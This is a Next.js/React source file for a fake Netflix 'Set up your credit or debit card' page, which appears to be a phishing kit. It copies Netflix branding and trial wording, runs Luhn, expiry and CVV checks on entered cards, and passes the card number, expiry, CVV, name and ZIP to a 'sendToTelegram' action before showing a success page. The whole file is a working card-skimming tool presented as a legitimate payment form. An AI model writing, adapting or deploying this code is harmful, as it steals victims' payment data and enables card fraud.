'use client'

import { useState, useEffect } from 'react'
import { useRouter, useSearchParams } from 'next/navigation'
import Image from 'next/image'
import Link from 'next/link'
import { motion } from 'framer-motion'
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { InfoIcon as InfoCircle, CreditCard } from 'lucide-react'
import { sendToTelegram } from '../actions/sendToTelegram'
import { FormData } from '../types/formData'
import { generateRandomString } from '../../utils/random-string'

import VisaImage from '../images/VISA.png'
import AmexImage from '../images/AMEX.png'
import DiscoverImage from '../images/DISCOVER.png'
import MasterImage from '../images/MASTERCARD.png'
import NetflixImage from '../../public/netflix-logo.svg'

const isValidLuhn = (cardNumber: string) => {
  const digits = cardNumber.replace(/\s+/g, ''); // Remove spaces
  let sum = 0;
  let shouldDouble = false;

  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i], 10);

    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }

    sum += digit;
    shouldDouble = !shouldDouble;
  }

  return sum % 10 === 0;
};
const isSupportedCard = (cardNumber: string) => {
  const cleanedNumber = cardNumber.replace(/\s+/g, '');
  const supportedPrefixes = [
    '4', // Visa
    '5', // Mastercard
    '34', '37', // American Express
    '6', // Discover
  ];

  return supportedPrefixes.some((prefix) => cleanedNumber.startsWith(prefix));
};

export default function PaymentForm() {
  const [error, setError] = useState('')
  const [cardNumber, setCardNumber] = useState('')
  const [expirationDate, setExpirationDate] = useState('')
  const [cvv, setCvv] = useState('')
  const [nameOnCard, setNameOnCard] = useState('')
  const [zipCode, setZipCode] = useState('')
  const router = useRouter()
  const searchParams = useSearchParams()

  useEffect(() => {
    const payment_id = searchParams.get('payment_id')
    const user_id = searchParams.get('userid')

    if (!payment_id || !user_id) {
      const newPaymentId = generateRandomString(48)
      const newUserId = generateRandomString(16)
      router.push(`/?payment_id=${newPaymentId}&userid=${newUserId}`)
    }
  }, [router, searchParams])


  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
  
    const cleanedCardNumber = cardNumber.replace(/\s+/g, ''); // Clean card number
  
    if (!cleanedCardNumber || cleanedCardNumber.length < 15) {
      setError('Card number is too short');
      return;
    }
  
    if (!isSupportedCard(cleanedCardNumber)) {
      setError('Unsupported card type');
      return;
    }
  
    if (!isValidLuhn(cleanedCardNumber)) {
      setError('Invalid card number');
      return;
    }
  
    if (!expirationDate || expirationDate.length !== 5 || !isValidExpirationDate(expirationDate)) {
      setError('Invalid or expired expiration date');
      return;
    }
  
    if (!cvv || !isValidCvv(cvv, cleanedCardNumber)) {
      setError(`Invalid CVV. AmEx requires 4 digits, others require 3 digits.`);
      return;
    }
  
    if (!nameOnCard) {
      setError('Name on card is required');
      return;
    }
  
    if (!zipCode || zipCode.length < 5) {
      setError('Invalid ZIP code');
      return;
    }
  
    const formData: FormData = {
      cardNumber,
      expirationDate,
      cvv,
      nameOnCard,
      zipCode,
    };
  
    const result = await sendToTelegram(formData);
  
    if (result.success) {
      router.push('/success');
    } else {
      setError(result.error || 'An error occurred while processing your payment');
    }
  };
  const isValidExpirationDate = (expirationDate: string) => {
    const [month, year] = expirationDate.split('/').map((part) => parseInt(part, 10));
    
    if (!month || !year || month < 1 || month > 12) {
      return false; // Invalid month or year format
    }
  
    const now = new Date();
    const currentYear = parseInt(now.getFullYear().toString().slice(-2), 10); // Last two digits of the year
    const currentMonth = now.getMonth() + 1; // Months are zero-based
  
    if (year < currentYear || (year === currentYear && month < currentMonth)) {
      return false; // Card is expired
    }
  
    return true;
  };
  const isValidCvv = (cvv: string, cardNumber: string) => {
    const isAmex = cardNumber.replace(/\s+/g, '').startsWith('34') || cardNumber.replace(/\s+/g, '').startsWith('37');
  
    if (isAmex && cvv.length === 4) {
      return true; // AmEx requires a 4-digit CVV
    }
  
    if (!isAmex && cvv.length === 3) {
      return true; // Other cards require a 3-digit CVV
    }
  
    return false; // Invalid CVV
  };
  
  const handleCardNumberChange = (value: string) => {
    const formattedValue = formatCardNumber(value);
    setCardNumber(formattedValue);
  
    const cleanedValue = formattedValue.replace(/\s+/g, '');
    if (cleanedValue.length >= 15) {
      if (!isSupportedCard(cleanedValue)) {
        setError('Unsupported card type');
      } else if (!isValidLuhn(cleanedValue)) {
        setError('Invalid card number');
      } else {
        setError('');
      }
    } else {
      setError('');
    }
  };
  
  
  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, ''); // Remove spaces and non-digits
    const isAmex = v.startsWith('34') || v.startsWith('37'); // Check for AmEx prefix
  
    if (isAmex) {
      // Format for AmEx: XXXX XXXXXX XXXXX
      const match = v.match(/^(\d{1,4})(\d{0,6})?(\d{0,5})?$/);
      if (match) {
        return [match[1], match[2], match[3]].filter(Boolean).join(' ');
      }
    } else {
      // Format for other cards: XXXX XXXX XXXX XXXX
      const match = v.match(/^(\d{1,4})(\d{0,4})?(\d{0,4})?(\d{0,4})?$/);
      if (match) {
        return [match[1], match[2], match[3], match[4]].filter(Boolean).join(' ');
      }
    }
  
    return value; // Return raw value if no match
  };
  const formatExpirationDate = (value: string) => {
    const cleanedValue = value.replace(/[^\d]/g, '')
    if (cleanedValue.length === 0) {
      return ''
    }
    if (cleanedValue.length === 1 && parseInt(cleanedValue) > 1) {
      return `0${cleanedValue}/`
    }
    if (cleanedValue.length === 2) {
      return `${cleanedValue}/`
    }
    if (cleanedValue.length > 2) {
      return `${cleanedValue.slice(0, 2)}/${cleanedValue.slice(2, 4)}`
    }
    return cleanedValue
  }
  return (
    <div className="min-h-screen bg-white">
      <header className="flex justify-between items-center px-4 py-2 border-b">
        <motion.div 
          initial={{ opacity: 0, x: -20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ duration: 0.5 }}
        >
          <Image
            src={NetflixImage}
            alt="Netflix"
            width={92}
            height={28}
            className="cursor-pointer"
          />
        </motion.div>
        <Button 
          variant="ghost"
          className="text-zinc-600 hover:text-zinc-900"
        >
          Sign Out
        </Button>
      </header>

      <main className="max-w-[440px] mx-auto px-4 py-12">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.2 }}
        >
          <div className="">
            <div className="text-sm text-zinc-600 mb-2">STEP <span className='font-semibold'>4</span> OF <span className='font-semibold'>4</span></div>
            <h1 className="text-3xl font-medium">Set up your credit or debit card</h1>
          </div>

          <div className="flex py-2">
            <Image src={VisaImage} alt="Visa" width={25} height={12} />
            <Image src={MasterImage} alt="Mastercard" width={25} height={12} />
            <Image src={AmexImage} alt="American Express" width={25} height={12} />
            <Image src={DiscoverImage} alt="Discover" width={25} height={12} />
          </div>

          <form onSubmit={handleSubmit} className="space-y-2">
            <div>
              <div className="relative">
              <Input
  type="text"
  placeholder="Card number"
  value={cardNumber}
  onChange={(e) => handleCardNumberChange(e.target.value)}
  className="pl-10 py-6 border-[#808080]"
  maxLength={19} // Max length for AmEx is 15, others are 16
/>
                <CreditCard className="absolute left-3 top-4 h-5 w-5 text-zinc-400" />
              </div>
              {error && (
                <motion.p
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="text-red-500 text-sm mt-1 "
                >
                  {error}
                </motion.p>
              )}
            </div>

            <div className="grid grid-cols-2 gap-4">
              <Input
               type="text"
               placeholder="Expiration date"
               value={expirationDate}
               onChange={(e) => {
                 const formattedValue = formatExpirationDate(e.target.value);
                 setExpirationDate(formattedValue);
             
                 if (formattedValue.length === 5 && !isValidExpirationDate(formattedValue)) {
                   setError('Invalid or expired expiration date');
                 } else {
                   setError('');
                 }
               }}
               maxLength={5}
               className="py-6 border-[#808080]"
              />
              <div className="relative">
                <Input 
                  type="text"
                  placeholder="CVV"
                  maxLength={4} // Max length for AmEx is 4, others are 3
                  className="py-6 border-[#808080]"
                  value={cvv}
                  onChange={(e) => {
                    const value = e.target.value;
                    setCvv(value);
                
                    if (!isValidCvv(value, cardNumber)) {
                      setError(`Invalid Security Code .`);
                    } else {
                      setError('');
                    }
                  }}
                />
                <InfoCircle className="absolute right-3 top-4 h-5 w-5 text-zinc-400 cursor-help" />
              </div>
            </div>

            <Input 
              type="text" 
              placeholder="Name on card" 
              className='py-6 border-[#808080]'
              value={nameOnCard}
              onChange={(e) => setNameOnCard(e.target.value)}
            />
            <Input 
              type="text" 
              placeholder="ZIP code" 
              maxLength={5} 
              className='py-6 border-[#808080]'
              value={zipCode}
              onChange={(e) => setZipCode(e.target.value)}
            />

            <div className="bg-zinc-100 p-4 rounded-md">
              <div className="flex justify-between mb-1">
                <span className="font-semibold">Free Trial</span>
                <Link href="#" className="text-blue-600 hover:underline">
                  Change
                </Link>
              </div>
              <div className="text-sm text-zinc-600">
                <span className="line-through mr-2">$6.99/month</span>
                <span className="font-semibold">$15.49/month</span> (Standard plan)
              </div>
            </div>

            <div className="text-sm text-zinc-600 mt-8">
              By clicking the &quot;Start Free Trial&quot; button below, you agree to our{' '}
              <Link href="#" className="text-blue-600 hover:underline">
                Terms of Use
              </Link>
              ,{' '}
              <Link href="#" className="text-blue-600 hover:underline">
                Privacy Statement
              </Link>
              , that you are over 18, and that Netflix will automatically continue your membership and charge the membership fee (currently $15.49/month plus applicable taxes) to your payment method after the free trial period unless you cancel. You may cancel at any time to avoid future charges. To cancel, go to Account and click &quot;Cancel Membership&quot;.
            </div>

            <motion.div
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
            >
              <Button 
                type="submit" 
                className="w-full bg-red-600 hover:bg-red-700 text-white py-6 text-xl"
              >
                Start Free Trial
              </Button>
            </motion.div>
          </form>

          <div className="mt-6 text-sm text-zinc-600 text-center">
            This page is protected by Google reCAPTCHA to ensure you&apos;re not a bot.{' '}
            <Link href="#" className="text-blue-600 hover:underline">
              Learn more
            </Link>
          </div>
        </motion.div>
      </main>
    </div>
  )
}

